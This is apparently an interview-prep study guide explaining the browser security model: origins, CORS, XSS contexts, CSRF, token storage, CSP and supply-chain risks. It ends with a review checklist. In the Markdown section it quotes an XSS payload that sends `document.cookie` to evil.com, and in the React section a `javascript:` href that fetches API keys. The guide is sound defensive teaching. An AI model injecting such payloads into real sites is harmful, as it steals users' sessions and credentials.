# Answer Bank 6 — The Browser Security Model

Fills §18 of the [knowledge map](../frontend-knowledge-map.md). The corpus mentions XSS exactly once, in passing, during Okta's Markdown-rendering design discussion. This is the model underneath.

---

## The one idea underneath everything here

> **The browser's entire security model is built on one concept — the origin — and every security feature is either enforcing that boundary or deliberately relaxing it.**

Origin = **scheme + host + port**. `https://app.example.com` and `https://api.example.com` are different origins. So are `http://` and `https://` on the same host. Once you hold that, CORS, cookies, CSP, `postMessage`, and iframe isolation all stop being separate topics.

---

## Q: What is the same-origin policy, and what does CORS actually do?

**Answer.** The **same-origin policy** is the default: a document from origin A cannot *read* data from origin B. It can still *send* requests (which is why CSRF exists) — it just can't read the responses, can't touch B's DOM, and can't read B's cookies or storage.

**CORS is not a security feature protecting your server.** This is the single most misunderstood thing in frontend security. CORS is the mechanism by which a *server* tells the *browser* to relax the same-origin policy for specific origins. It is enforced **by the browser, in the browser**.

The consequences follow immediately:

- A CORS error means the browser blocked *you* from reading the response. **The request usually reached the server and executed.** A `DELETE` blocked by CORS may well have deleted the thing.
- `curl`, Postman, a mobile app, or any non-browser client **ignores CORS entirely**. It isn't an access control.
- Setting `Access-Control-Allow-Origin: *` doesn't "open a hole in your server" — your server had no protection from CORS to begin with. **Your server needs its own authentication and authorization**, always.

**Preflight:** for anything beyond a "simple" request (custom headers, `Content-Type: application/json`, methods beyond GET/POST/HEAD), the browser first sends an `OPTIONS` request asking permission. That's why adding one header can suddenly double your request count — cache it with `Access-Control-Max-Age`.

**With credentials:** `Access-Control-Allow-Credentials: true` requires an explicit origin — the wildcard is rejected. That restriction exists precisely to stop you accidentally exposing an authenticated API to every site on the internet.

---

## Q: How does XSS actually work, and how do you prevent it?

**Answer.** XSS is a **context** problem, not an input-sanitization problem. That reframe is the whole answer.

The same string is harmless in one place and catastrophic in another:

```html
<div>USER_INPUT</div>                 <!-- HTML text: needs HTML escaping -->
<div title="USER_INPUT">              <!-- attribute: needs attribute escaping -->
<a href="USER_INPUT">                 <!-- URL: javascript: is executable -->
<script>var x = "USER_INPUT"</script> <!-- JS: needs JS escaping; nearly always wrong -->
<div style="USER_INPUT">              <!-- CSS: can exfiltrate data -->
```

"Sanitize on input" fails because at input time you don't know which context it will land in. **Encode at output, per context.** That's the rule.

**The three types:**
- **Stored** — malicious content is saved server-side and served to every viewer. Worst impact.
- **Reflected** — payload comes from the URL and is echoed into the page.
- **DOM-based** — never touches the server; client JS reads `location.hash` and writes it into the DOM.

### What React gives you, and the four holes it doesn't

React escapes text content in JSX by default, which eliminates the most common vector. **But it is not a sandbox.** These remain:

```jsx
// 1. The explicit escape hatch — the name is a warning
<div dangerouslySetInnerHTML={{ __html: userContent }} />

// 2. URL-valued props — React does NOT validate schemes
<a href={userInput}>          // userInput = "javascript:fetch('/api/keys').then(...)"
<img src={userInput} />
<iframe src={userInput} />

// 3. Spreading unvalidated props — can inject onError, onLoad, etc.
<div {...userSuppliedProps} />

// 4. Direct DOM escape hatches
ref.current.innerHTML = userInput;
```

**The URL one catches people constantly.** Validate the scheme:

```javascript
function safeUrl(raw) {
  try {
    const url = new URL(raw, window.location.origin);
    return ["http:", "https:", "mailto:"].includes(url.protocol) ? url.href : "#";
  } catch {
    return "#";
  }
}
```

### The Markdown case (Okta's design round)

User-authored Markdown is a **direct XSS vector**, because most Markdown specs permit raw HTML passthrough. `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` is valid Markdown.

The correct pipeline:

```
Markdown → parse → sanitize with an ALLOWLIST → render
```

Use `rehype-sanitize` or DOMPurify with an explicit allowlist of tags and attributes. **Allowlist, never denylist** — you cannot enumerate every dangerous construct, and attackers only need the one you missed. Sanitize at **publish time** so you pay the cost once and store known-safe output, and keep a CSP as the layer that catches your mistakes.

---

## Q: What is CSRF and why does `SameSite` mostly solve it?

**Answer.** CSRF exploits the fact that **browsers attach cookies automatically based on the destination, regardless of who initiated the request.** `evil.com` can submit a form to `yourbank.com/transfer`, and the browser helpfully includes the user's session cookie. The attacker can't *read* the response (same-origin policy), but the transfer already happened — for a state-changing action that's the entire attack.

**Defenses, in order of practicality:**

1. **`SameSite` cookies.** `SameSite=Lax` (now the browser default) blocks cookies on cross-site POSTs while still allowing top-level GET navigation, which closes the classic attack. `Strict` is tighter but breaks inbound links from other sites.
2. **Anti-CSRF tokens** — a per-session unpredictable token in a header or hidden field, which the attacker can't read across origins.
3. **Token-in-header auth** — if you send `Authorization: Bearer …` from JS rather than relying on cookies, CSRF largely evaporates, because the browser doesn't attach that header automatically.

**The distinction to state:** XSS defeats every CSRF defense. If an attacker runs JS on your origin, they can read your CSRF token and your `localStorage`. **XSS is the more fundamental vulnerability** — fix it first.

---

## Q: Where do you store auth tokens?

**Answer.** There is no clean answer, and saying so is the answer. It's a trade-off between two attack classes:

| | `localStorage` | `httpOnly` cookie |
|---|---|---|
| Readable by XSS | **Yes** — any injected script gets it | **No** — JS can't touch it |
| Vulnerable to CSRF | No — not sent automatically | **Yes** — mitigated by `SameSite` |
| Works cross-domain | Easy | Needs care |
| Survives tab close | Yes | Depends on expiry |

**The defensible position:** `httpOnly; Secure; SameSite=Lax` cookies for session tokens, because XSS is both more common and more damaging than CSRF, and `SameSite` handles CSRF well. Pair it with short-lived access tokens plus refresh-token rotation, so a stolen token has a small window.

**The point that matters more than the choice:** if you have XSS, you have lost regardless. `httpOnly` stops token *exfiltration*, but injected script can still make authenticated requests as the user from inside the page. Storage choice limits blast radius; it doesn't substitute for preventing injection.

---

## Q: What does a Content Security Policy do?

**Answer.** CSP is **defense in depth** — it assumes you will eventually ship an XSS bug and limits what that bug can do. It tells the browser which sources of script, style, image, and connection are permitted.

```
Content-Security-Policy:
  default-src 'self';
  script-src 'self' 'nonce-{RANDOM_PER_REQUEST}';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
  object-src 'none';
  base-uri 'self';
```

With that policy, an injected `<script>alert(1)</script>` **doesn't execute** — it has no valid nonce. The XSS bug is still there, but it's inert.

**Key directives and why:**
- `script-src` with a **per-request nonce** — the meaningful one. `'unsafe-inline'` in `script-src` disables essentially all XSS protection, so avoid it.
- `connect-src` limits where data can be exfiltrated *to*, which blunts the payoff even if script does run.
- `frame-ancestors 'none'` replaces `X-Frame-Options` and prevents **clickjacking** (your page loaded invisibly in an attacker's iframe over their buttons).
- `object-src 'none'` and `base-uri 'self'` close legacy injection routes.

**Rollout without breaking production:** ship `Content-Security-Policy-Report-Only` with a `report-uri` first, collect violations for a week, fix what's legitimate, then enforce.

**The other security headers worth setting once:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

---

## Q: What about third-party scripts and dependencies?

**Answer.** This is the largest real-world frontend risk and it gets the least attention.

**Every third-party script on your page runs with your origin's full privileges.** An analytics tag, a chat widget, a tag manager — each can read your DOM, your cookies (non-`httpOnly`), your `localStorage`, and can make authenticated requests as your user. You have transitively trusted that vendor's entire security posture *and* their build pipeline. Real breaches (British Airways, Ticketmaster) came through exactly this path.

**Mitigations:**
- **Subresource Integrity** — `<script src="…" integrity="sha384-…" crossorigin="anonymous">`. The browser refuses to execute if the file's hash changed, so a compromised CDN can't swap the file.
- **Self-host** critical dependencies rather than loading from someone else's CDN.
- **Sandbox** what you can into an iframe with a restrictive `sandbox` attribute.
- **CSP `connect-src`** limits where a rogue script can send what it steals.
- **Audit periodically** — most teams accumulate tags nobody remembers approving.

**Supply chain, in your own dependency tree:** `npm audit` and Dependabot for known CVEs; lockfiles committed so builds are reproducible; `npm ci` in CI; scrutiny of postinstall scripts; and awareness of typosquatting. A transitive dependency five levels down runs with the same privileges as your own code at build time.

**The one rule that prevents the most damage:** **secrets never go in the bundle.** Everything shipped to the browser is public — `NEXT_PUBLIC_*`, `VITE_*`, anything in the client build. Minification is not obfuscation. If a key must stay secret, the request that uses it happens server-side, full stop.

---

## Q: What else should a frontend engineer own?

**Answer — the short list that comes up in real reviews:**

- **Validation is two jobs.** Client-side validation is **UX** (fast feedback). Server-side validation is **security**. Anyone can bypass your form with `curl`. Never treat a client check as a control.
- **Authorization is server-side.** Hiding an admin button is a UI convenience, not a permission. Every protected action needs a server-side check on every request.
- **Don't leak data into the client.** `getServerSideProps` returning a whole user record, an API returning `password_hash`, an error message including a stack trace or SQL. Shape responses to what the UI needs.
- **Open redirects.** `/login?next=…` that blindly redirects enables convincing phishing. Allowlist the destinations, or accept only relative paths.
- **`window.opener`.** `target="_blank"` links can let the destination navigate your page. Modern browsers default to `noopener`, but set `rel="noopener noreferrer"` explicitly.
- **`postMessage`** — always verify `event.origin`. Never pass `"*"` as `targetOrigin` for anything sensitive.
- **Rate limiting and enumeration.** Login and password-reset endpoints need rate limits, and their responses shouldn't reveal whether an account exists.

---

## The security review checklist

Run this over any feature touching user input, auth, or third-party data:

- [ ] Is user-controlled data rendered into HTML, an attribute, a URL, or a script context? Encoded for **that** context?
- [ ] Any `dangerouslySetInnerHTML`? Is the input allowlist-sanitized?
- [ ] Any user-controlled `href` / `src` / `action`? Scheme validated?
- [ ] Are state-changing requests protected by `SameSite` or a token?
- [ ] Is authorization enforced server-side, not just hidden in the UI?
- [ ] Any secrets, keys, or internal URLs in the client bundle?
- [ ] Do API responses contain fields the UI doesn't need?
- [ ] New third-party scripts — vetted, SRI-pinned, CSP-covered?
- [ ] Do error messages leak internals to the user?
- [ ] Is validation duplicated server-side?

---

*Next: [`07-modern-react-data.md`](./07-modern-react-data.md)*
